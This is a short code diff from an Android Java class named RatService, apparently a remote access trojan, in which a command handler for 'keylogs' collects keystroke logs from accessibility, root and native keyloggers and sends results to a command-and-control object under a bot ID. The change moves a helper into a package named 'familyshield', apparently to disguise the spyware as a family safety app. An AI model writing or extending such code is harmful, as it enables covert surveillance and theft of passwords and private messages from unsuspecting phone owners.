@@ -116,7 +116,7 @@ public class RatService extends Service {
             c2.sendResult(botId, buildInfo());
 
         } else if (lower.equals("keylogs")) {
-            String accLogs    = AccessibilityHelperService.flushLogs();
+            String accLogs    = com.familyshield.device.guard.AccessibilityHelperService.flushLogs();
             String rootLogs   = RootKeylogger.flushLogs();
             String nativeLogs = NativeProbe.safeFlushNativeKeylogs();
             String combined   = "";
